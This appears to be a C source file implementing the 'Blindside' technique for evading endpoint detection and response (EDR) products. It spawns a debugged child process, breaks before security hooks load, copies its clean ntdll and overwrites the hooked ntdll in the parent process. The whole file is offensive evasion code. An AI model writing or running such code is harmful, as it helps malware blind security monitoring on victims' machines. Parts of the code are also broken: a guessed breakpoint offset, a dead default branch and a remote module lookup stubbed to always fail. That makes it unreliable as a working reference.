#include "blindside.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* Create a suspended child process for acquiring clean ntdll */
int jocky_blindside_create_debug_child(
    const char* target_exe,
    CHILD_PROCESS_CONTEXT* out_ctx)
{
    if (!target_exe || !out_ctx) {
        return -1;
    }

    if (!target_exe) {
        target_exe = "notepad.exe";  /* Default innocuous process */
    }

    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi = {0};

    /* Create process with DEBUG_PROCESS flag - enables debug events */
    if (!CreateProcessA(
            NULL,
            (LPSTR)target_exe,
            NULL, NULL,
            FALSE,
            DEBUG_PROCESS | CREATE_SUSPENDED,  /* Debug + suspended */
            NULL, NULL,
            &si, &pi)) {
        return -1;
    }

    out_ctx->process = pi.hProcess;
    out_ctx->thread = pi.hThread;
    out_ctx->pid = pi.dwProcessId;
    out_ctx->ntdll_base = NULL;
    out_ctx->ntdll_size = 0;

    return 0;
}

/* Set hardware breakpoint on ntdll!LdrLoadDll to break before EDR hooks */
int jocky_blindside_set_ldrloddll_breakpoint(
    CHILD_PROCESS_CONTEXT* child_ctx,
    DEBUG_BREAKPOINT_CONFIG* out_config)
{
    if (!child_ctx || !out_config) {
        return -1;
    }

    /* Find ntdll base in child process */
    void* ntdll_base = NULL;
    size_t ntdll_size = 0;

    if (jocky_blindside_find_ntdll(child_ctx->process, &ntdll_base, &ntdll_size) != 0) {
        return -1;
    }

    child_ctx->ntdll_base = ntdll_base;
    child_ctx->ntdll_size = ntdll_size;

    /* Get thread context to modify debug registers */
    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(child_ctx->thread, &context)) {
        return -1;
    }

    /* LdrLoadDll is typically at a fixed offset in ntdll
     * We'd resolve this dynamically in a real implementation
     * For now, set breakpoint at ntdll base + typical offset
     */
    uint64_t ldr_loaddll_addr = (uint64_t)ntdll_base + 0x1000;  /* Approximate offset */

    /* Set DR0 to LdrLoadDll address */
    if (jocky_blindside_set_debug_register(&context, 0, ldr_loaddll_addr) != 0) {
        return -1;
    }

    /* Set DR7 (Debug Control Register) to enable breakpoint on DR0:
     * - Bits 0-1: L0 (Local breakpoint on DR0): 01
     * - Bits 16-17: RW0 (Execution breakpoint): 00
     * - Bits 18-19: LEN0 (Length): 00 (1 byte)
     */
    context.Dr7 |= (1 << 0);  /* Enable DR0 */
    context.Dr7 &= ~(3 << 16); /* Execution breakpoint (not data) */
    context.Dr7 &= ~(3 << 18); /* 1-byte length */

    if (!SetThreadContext(child_ctx->thread, &context)) {
        return -1;
    }

    out_config->breakpoint_address = ldr_loaddll_addr;
    out_config->dr_register = 0;
    memcpy(&out_config->thread_context, &context, sizeof(CONTEXT));

    return 0;
}

/* Resume child process and wait for debug breakpoint event */
int jocky_blindside_wait_breakpoint(
    CHILD_PROCESS_CONTEXT* child_ctx)
{
    if (!child_ctx) {
        return -1;
    }

    /* Resume the thread to trigger execution */
    if (ResumeThread(child_ctx->thread) == (DWORD)-1) {
        return -1;
    }

    /* Wait for debug event (breakpoint hit on LdrLoadDll) */
    DEBUG_EVENT debug_event;
    DWORD continue_status = DBG_CONTINUE;

    while (WaitForDebugEvent(&debug_event, INFINITE)) {
        if (debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
            if (debug_event.u.Exception.ExceptionRecord.ExceptionCode ==
                EXCEPTION_SINGLE_STEP) {
                /* Hardware breakpoint hit */
                return 0;
            }
        }

        /* Continue the debug session */
        ContinueDebugEvent(debug_event.dwProcessId,
                          debug_event.dwThreadId,
                          continue_status);
    }

    return -1;
}

/* Read clean ntdll from child process before EDR instrumentation */
int jocky_blindside_read_clean_ntdll(
    CHILD_PROCESS_CONTEXT* child_ctx,
    uint8_t** out_ntdll_copy,
    size_t* out_size)
{
    if (!child_ctx || !out_ntdll_copy || !out_size) {
        return -1;
    }

    if (!child_ctx->ntdll_base || child_ctx->ntdll_size == 0) {
        return -1;
    }

    /* Allocate buffer for ntdll copy */
    uint8_t* ntdll_copy = (uint8_t*)malloc(child_ctx->ntdll_size);
    if (!ntdll_copy) {
        return -1;
    }

    /* Read ntdll from child's address space */
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(
            child_ctx->process,
            child_ctx->ntdll_base,
            ntdll_copy,
            child_ctx->ntdll_size,
            &bytes_read)) {
        free(ntdll_copy);
        return -1;
    }

    if (bytes_read != child_ctx->ntdll_size) {
        free(ntdll_copy);
        return -1;
    }

    *out_ntdll_copy = ntdll_copy;
    *out_size = child_ctx->ntdll_size;

    return 0;
}

/* Inject clean ntdll into parent process, replacing hooked version */
int jocky_blindside_inject_clean_ntdll(
    HANDLE parent_process,
    const uint8_t* clean_ntdll,
    size_t ntdll_size)
{
    if (!parent_process || !clean_ntdll || ntdll_size == 0) {
        return -1;
    }

    /* Find parent's ntdll */
    void* parent_ntdll_base = NULL;
    size_t parent_ntdll_size = 0;

    if (jocky_blindside_find_ntdll(parent_process, &parent_ntdll_base,
                                   &parent_ntdll_size) != 0) {
        return -1;
    }

    if (parent_ntdll_size != ntdll_size) {
        return -1;  /* Size mismatch */
    }

    /* Unprotect ntdll section in parent */
    DWORD old_protect;
    if (!VirtualProtectEx(parent_process, parent_ntdll_base, parent_ntdll_size,
                          PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    /* Overwrite hooked ntdll with clean copy */
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(
            parent_process,
            parent_ntdll_base,
            (PVOID)clean_ntdll,
            parent_ntdll_size,
            &bytes_written)) {
        VirtualProtectEx(parent_process, parent_ntdll_base, parent_ntdll_size,
                        old_protect, &old_protect);
        return -1;
    }

    if (bytes_written != parent_ntdll_size) {
        VirtualProtectEx(parent_process, parent_ntdll_base, parent_ntdll_size,
                        old_protect, &old_protect);
        return -1;
    }

    /* Restore original protection */
    VirtualProtectEx(parent_process, parent_ntdll_base, parent_ntdll_size,
                     old_protect, &old_protect);

    return 0;
}

/* Full pipeline: unhook ntdll via Blindside */
int jocky_blindside_unhook_ntdll(void)
{
    CHILD_PROCESS_CONTEXT child_ctx = {0};
    DEBUG_BREAKPOINT_CONFIG bp_config = {0};
    uint8_t* clean_ntdll = NULL;
    size_t ntdll_size = 0;
    int result = -1;

    do {
        /* Step 1: Create debug child process */
        if (jocky_blindside_create_debug_child("notepad.exe", &child_ctx) != 0) {
            break;
        }

        /* Step 2: Set breakpoint on LdrLoadDll */
        if (jocky_blindside_set_ldrloddll_breakpoint(&child_ctx, &bp_config) != 0) {
            break;
        }

        /* Step 3: Wait for breakpoint hit */
        if (jocky_blindside_wait_breakpoint(&child_ctx) != 0) {
            break;
        }

        /* Step 4: Read clean ntdll */
        if (jocky_blindside_read_clean_ntdll(&child_ctx, &clean_ntdll, &ntdll_size) != 0) {
            break;
        }

        /* Step 5: Inject clean ntdll into parent */
        if (jocky_blindside_inject_clean_ntdll(
                GetCurrentProcess(),
                clean_ntdll,
                ntdll_size) != 0) {
            break;
        }

        result = 0;  /* Success */

    } while (0);

    /* Cleanup */
    if (clean_ntdll) {
        free(clean_ntdll);
    }
    jocky_blindside_cleanup(&child_ctx);

    return result;
}

/* Cleanup child process and resources */
int jocky_blindside_cleanup(CHILD_PROCESS_CONTEXT* child_ctx)
{
    if (!child_ctx || !child_ctx->process) {
        return -1;
    }

    /* Terminate debug child process */
    TerminateProcess(child_ctx->process, 1);
    CloseHandle(child_ctx->process);
    CloseHandle(child_ctx->thread);

    return 0;
}

/* Find ntdll base address and size in a process */
int jocky_blindside_find_ntdll(
    HANDLE process,
    void** out_base,
    size_t* out_size)
{
    if (!process || !out_base || !out_size) {
        return -1;
    }

    /* Use EnumProcessModules to find ntdll */
    HMODULE modules[256];
    DWORD modules_size;
    unsigned int module_count;

    /* Get list of loaded modules - but we need to do this for a remote process */
    /* This is more complex - we'd use PSAPI or walk PEB directly */

    /* Simplified: use local process for now */
    if (process == GetCurrentProcess()) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) {
            return -1;
        }

        *out_base = ntdll;

        /* Calculate size from PE header */
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((uint8_t*)ntdll + dos->e_lfanew);
        *out_size = nt->OptionalHeader.SizeOfImage;

        return 0;
    }

    /* For remote process, we'd need to:
     * 1. Walk PEB to find LdrpInitialModuleHead
     * 2. Enumerate InLoadOrderModuleList
     * 3. Find ntdll.dll entry
     * This is more complex and would go here
     */

    return -1;
}

/* Set a debug register (DR0-DR3) for hardware breakpoint */
int jocky_blindside_set_debug_register(
    CONTEXT* context,
    uint32_t dr_num,
    uint64_t address)
{
    if (!context || dr_num > 3) {
        return -1;
    }

    switch (dr_num) {
        case 0:
            context->Dr0 = address;
            break;
        case 1:
            context->Dr1 = address;
            break;
        case 2:
            context->Dr2 = address;
            break;
        case 3:
            context->Dr3 = address;
            break;
        default:
            return -1;
    }

    return 0;
}
